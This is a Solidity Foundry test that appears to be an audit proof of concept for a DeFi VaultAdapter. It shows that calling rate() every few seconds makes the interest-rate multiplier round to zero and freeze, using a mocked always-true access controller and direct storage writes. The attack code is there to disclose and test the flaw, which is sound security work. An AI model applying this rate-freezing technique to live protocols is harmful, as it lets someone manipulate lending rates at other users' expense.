// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

/*
This PoC shows that an attacker can completely “freeze” the utilisation multiplier
by calling VaultAdapter.rate(..) often enough so that the   _elapsed * rate / 1e27
term rounds down to zero.  While the spam continues the interest-rate remains
locked; once the spam stops the multiplier jumps again.

The test performs three phases:
1.  One “normal” call to establish a baseline interest-rate.
2.  100 very-frequent calls (every 10 s) – the rate MUST stay identical.
3.  A single call after a 1-day pause – the rate MUST increase.
*/

import "forge-std/Test.sol";

import {ERC1967Proxy} from "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {VaultAdapter}   from "contracts/oracle/libraries/VaultAdapter.sol";
import {IVaultAdapter}  from "contracts/interfaces/IVaultAdapter.sol";

/* -------------------------------------------------------------------------- */
/*                                Test helpers                                */
/* -------------------------------------------------------------------------- */

contract AccessControlMock {
    /* A dummy access-controller that simply returns “true” for every call.
       This lets us bypass the internal Access checks without having to know
       the exact selector that `Access.checkAccess` uses.                  */
    fallback() external payable {
        assembly {
            mstore(0x00, 1)
            return(0x00, 0x20) /* abi.encode(true) */
        }
    }
    receive() external payable {}
}

interface IVault {
    function currentUtilizationIndex(address) external returns (uint256);
    function utilization(address) external view returns (uint256);
}

contract MockVault is IVault {
    uint256 public utilizationValue;        // utilisation in RAY (1e27)
    uint256 private index;                  // monotonically increasing index
    uint256 private lastTimestamp;          // tracks timestamp of last update

    function setUtilization(uint256 _util) external { utilizationValue = _util; }

    /* Simulate a simple cumulative utilisation index so that
       (index_now - index_before) / elapsed  ==  utilisationValue         */
    function currentUtilizationIndex(address) external override returns (uint256) {
        uint256 now_ = block.timestamp;
        if (lastTimestamp == 0) {
            lastTimestamp = now_;
            return index;
        }
        uint256 elapsed = now_ - lastTimestamp;
        index += utilizationValue * elapsed;
        lastTimestamp = now_;
        return index;
    }

    function utilization(address) external view override returns (uint256) {
        return utilizationValue;
    }
}

/* -------------------------------------------------------------------------- */
/*                                Exploit test                                */
/* -------------------------------------------------------------------------- */

contract VaultAdapterMultiplierFreezeTest is Test {
    uint256 private constant RAY = 1e27;

    VaultAdapter adapter;
    MockVault    vault;
    address      asset = address(0xBEEF);

    function setUp() public {
        /* 1. Deploy logic + trivial access controller */
        VaultAdapter      logic  = new VaultAdapter();
        AccessControlMock access = new AccessControlMock();

        /* 2. Deploy proxy and initialise it */
        bytes memory init = abi.encodeCall(VaultAdapter.initialize, (address(access)));
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic), init);
        adapter = VaultAdapter(address(proxy));

        /* 3. Configure slopes & limits via the proxy.
              The access-controller always returns `true`,
              so we can call these privileged functions directly.       */
        IVaultAdapter.SlopeData memory slopes = IVaultAdapter.SlopeData({
            slope0: 1e25,            // 1  % base slope
            slope1: 2e25,            // 2  % post-kink slope
            kink:   5e26             // 50 % utilisation kink
        });

        adapter.setSlopes(asset, slopes);
        adapter.setLimits(
            3 * RAY,                 // maxMultiplier  = 3×
            5e26,                    // minMultiplier  = 0.5×
            RAY / 1 days             // rate chosen so full shift occurs in 24 h
        );

        /* 4. Deploy and prime the mock vault */
        vault = new MockVault();
        vault.setUtilization(8e26);  // 80 % utilisation – above the kink

        /* 5. Seed the multiplier with 1.0 (RAY) so future multiplications work.
              utilData[vault][asset].multiplier sits at:
              keccak256(asset . keccak256(vault . slot(0))) + 1                 */
        bytes32 outer = keccak256(abi.encode(address(vault), uint256(0)));
        bytes32 inner = keccak256(abi.encode(asset, outer));
        bytes32 multiplierSlot = bytes32(uint256(inner) + 1);
        vm.store(address(adapter), multiplierSlot, bytes32(RAY));

        /* 6. Start the clock at a deterministic point */
        vm.warp(1);
    }

    function testMultiplierFreeze() public {
        /* Phase 1 – establish baseline */
        uint256 baseline = adapter.rate(address(vault), asset);
        assertGt(baseline, 0);              // sanity-check: non-zero rate

        /* Phase 2 – spam oracle every 10 seconds for ~17 min                */
        for (uint256 i; i < 100; ++i) {
            vm.warp(block.timestamp + 10);
            uint256 newRate = adapter.rate(address(vault), asset);
            assertEq(newRate, baseline, "rate should stay frozen while spamming");
        }

        /* Phase 3 – let one full day pass: multiplier must finally move    */
        vm.warp(block.timestamp + 1 days);
        uint256 updated = adapter.rate(address(vault), asset);
        assertGt(updated, baseline, "rate should increase once spam stops");
    }
}